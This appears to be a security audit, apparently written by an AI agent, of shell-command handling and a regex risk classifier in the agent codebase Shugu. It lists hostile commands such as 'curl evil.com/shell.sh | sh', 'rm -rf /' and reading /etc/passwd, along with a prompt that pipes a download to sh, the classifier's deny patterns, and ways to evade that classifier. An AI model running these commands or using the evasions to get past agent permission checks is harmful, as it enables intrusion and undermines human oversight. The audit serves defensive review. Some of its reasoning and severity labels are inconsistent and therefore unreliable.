# Shell Injection Audit — Shugu

**Date:** 2026-04-19
**Auditor:** Hermes Agent
**Files Audited:** `src/tools/bash/BashTool.ts`, `src/skills/bundled/loop.ts`, `src/policy/classifier.ts`, `src/engine/loop.ts`, `src/context/workspace/git.ts`, `src/tools/bash/shells.ts`, `src/utils/security.ts`

---

## Summary

| File | Risk | Notes |
|------|------|-------|
| `BashTool.ts` | **HIGH** | User command passed directly to `bash -c` without sanitization |
| `classifier.ts` | **NONE** | Pattern-matching risk classifier only; does not execute |
| `skills/bundled/loop.ts` | **NONE** | Routes through agent loop, no direct shell spawn |
| `engine/loop.ts` | **NONE** | Orchestration only; shell spawns delegated to tools |
| `context/workspace/git.ts` | **LOW** | Uses array-args spawn (safe); args are hardcoded |
| `shells.ts` | **N/A** | Detection logic only; no user input in spawn paths |

---

## Detailed Findings

### 1. BashTool.ts — **CRITICAL SHELL INJECTION**

**Location:** `src/tools/bash/BashTool.ts:163`

```typescript
const child = spawn(shell.path, [...shell.args, command], {
  cwd,
  env: buildSafeEnv(),
  stdio: ['pipe', 'pipe', 'pipe'],
  timeout: timeoutMs,
});
```

**Issue:** The `command` string (user-provided via `call.input['command']`) is passed directly as the argument to `bash -c` (or equivalent shell `-c`). This means the shell will interpret all shell metacharacters.

**How it works:**
- `shell.path` = `/bin/bash` (or detected shell)
- `shell.args` = `['-c']`
- Spawn call becomes: `bash -c <user_command_string>`

**Attack Vectors (UNFILTERED):**
```
# Command chaining
echo test; cat /etc/passwd
echo test && rm -rf /
echo test || curl evil.com/shell.sh | sh

# Command substitution
echo $(id)
echo `id`

# Pipelines
echo test | sh

# Shell exec (detected by classifier, but still runs in other modes)
eval "malicious code"
exec some_command
```

**Input Validation (Insufficient):**
```typescript
validateInput(input: Record<string, unknown>): string | null {
  if (typeof input['command'] !== 'string' || !input['command']) {
    return 'command must be a non-empty string';
  }
  return null;
}
```
Only checks that command is a non-empty string. No sanitization of shell metacharacters.

**Environment Sanitization:**
- `buildSafeEnv()` strips sensitive env vars — irrelevant to command injection.

**Output Sanitization:**
- `sanitizeUntrustedContent()` only sanitizes output returned to the LLM — does not sanitize the input command.

**Impact:** In permission modes other than `fullAuto`, any command can be executed. Even in `fullAuto`, the classifier only detects known patterns (see below) and may be evaded.

---

### 2. classifier.ts — **RISK CLASSIFIER, NOT ENFORCEMENT**

**Location:** `src/policy/classifier.ts`

This file does NOT execute commands. It provides `classifyBashRisk()` which pattern-matches commands against known-dangerous patterns. It is used by `permissions.ts` in `fullAuto` mode.

**What it catches (HIGH_RISK_PATTERNS):**
- Destructive: `rm -rf`, `rmdir`, `mkfs`, `dd of=`
- Privilege: `sudo`, `su`, `chmod 777`, `chown`
- Network: `iptables`, `curl ... -d`, `wget ... -O`, `nc ... -e`
- Git destructive: `git push --force`, `git reset --hard`
- Shell injection patterns: `eval`, `exec`, `source`, `bash -c`, `sh -c`
- Pipe-to-shell: `curl ... | sh`, `wget ... | sh`
- Env modification: `export PATH=`, `> ~/.bashrc`

**What it may miss (Potential Evasion):**
- Unknown commands default to `medium` risk (prompts for confirmation in `fullAuto`)
- Obfuscated commands: `base64 -d <<< ... | bash`
- Indirect execution: `find . -exec sh -c '...' {} \;`
- Commands not in the pattern list

**Classifier Bypass Scenario:**
The classifier checks `lower` (lowercased command). An attacker could potentially use case-sensitive evasion or unusual encoding that bypasses regex detection while still executing.

---

### 3. permissions.ts — **CLASSIFIER USAGE**

**Location:** `src/policy/permissions.ts:94-123`

```typescript
if (this.mode === 'fullAuto' && category === 'execute') {
  const command = (call.input['command'] as string) ?? '';
  const risk = classifyBashRisk(command);

  if (risk.level === 'low') { return { decision: 'allow', ... }; }
  if (risk.level === 'high') { return { decision: 'ask', ... }; }
  // Medium also returns 'ask'
}
```

**Key insight:** In `fullAuto` mode, `low` risk commands execute without user prompt. `medium` and `high` risk commands require user confirmation. However, in `bypass` mode, ALL commands execute without confirmation.

**Modes that bypass classifier:**
- `bypass` mode: No permission checks at all (line 359-363 in `engine/loop.ts`)
- Other non-`fullAuto` modes: Use default allow/deny policies

---

### 4. loop.ts (bundled skill) — **NO DIRECT SHELL INJECTION**

**Location:** `src/skills/bundled/loop.ts:115`

```typescript
const result = await ctx.runAgent(prompt);
```

The loop skill takes a prompt and interval, then calls `ctx.runAgent()`. This routes through the agent loop, not directly to shell spawn. Shell injection would need to occur through a BashTool call triggered by the agent.

**Indirect Risk:** If a malicious user provides a prompt like `run echo $(curl evil.com | sh)`, the agent may execute it via BashTool if permission is granted.

---

### 5. git.ts — **SAFE ARRAY SPAWN**

**Location:** `src/context/workspace/git.ts:86`

```typescript
const child = spawn('git', args, { cwd, stdio: ['pipe', 'pipe', 'pipe'] });
```

This is **safe**. Git arguments are passed as an array, not through a shell interpreter. The `args` are hardcoded in the caller (`['status', '--short', '--branch']` etc.), not user-provided strings.

---

### 6. shells.ts — **NO USER INPUT IN SPAWN**

**Location:** `src/tools/bash/shells.ts`

Uses `execSync` for binary detection, but only with hardcoded shell names (`bash`, `zsh`, `pwsh`, etc.). No user-controlled values reach the shell spawn.

---

## Mitigations in Place

| Mitigation | Applies To | Effectiveness |
|-----------|------------|---------------|
| `buildSafeEnv()` | BashTool | Partial — strips env vars, does NOT sanitize command |
| `sanitizeUntrustedContent()` | Output only | Partial — prevents prompt injection in LLM context, NOT shell injection |
| `classifyBashRisk()` | BashTool in `fullAuto` | Partial — regex patterns may be evaded; only active in one permission mode |
| Array-args spawn | git.ts | Strong — but only for git context gathering |

---

## Recommendations

1. **Command Sanitization for BashTool:**
   - Either use array-args spawn (non-shell): `spawn('/bin/bash', ['-c', command])` actually still uses shell interpretation. True fix requires not using `-c`.
   - Or implement shell metacharacter escaping/sanitization before passing to `-c`.
   - Or use a safer alternative like `deno` with permissions, or Docker sandbox.

2. **Input Allowlist for BashTool:**
   - Instead of blacklist regex (classifier), implement an allowlist of permitted characters/patterns in `validateInput()`.

3. **Classifier Defense in Depth:**
   - Even in `fullAuto` mode, consider requiring confirmation for ALL shell commands, not just "unknown" ones.
   - Add more obfuscated pattern detection (base64, hex, etc.).

4. **Audit Other Spawn Points:**
   - `src/plugins/host.ts:330` — plugin broker spawns with user-controlled paths
   - `src/voice/capture.ts` — spawns `rec`, `arecord`, `sox` with user args
   - `src/remote/ssh.ts` — spawns `ssh` with user-controlled arguments

---

## Severity Assessment

| Finding | Severity | Exploitable Without Classifier |
|---------|----------|--------------------------------|
| BashTool shell injection | **HIGH** | Yes — validation only checks non-empty string |
| Classifier evasion | **MEDIUM** | N/A (secondary defense) |
| Other spawn points | **LOW-MEDIUM** | Requires separate audit |

---

## Conclusion

**BashTool.ts contains a confirmed shell injection vulnerability.** User-provided command strings are passed directly to `bash -c` (or equivalent) without sanitization of shell metacharacters. While the `classifyBashRisk` classifier provides some defense in `fullAuto` permission mode, it is regex-based and can potentially be evaded. The classifier does not protect in other permission modes.

**Recommended immediate action:** Add shell metacharacter sanitization to `BashTool.validateInput()` or before the `spawn()` call, or switch to a non-shell execution model.
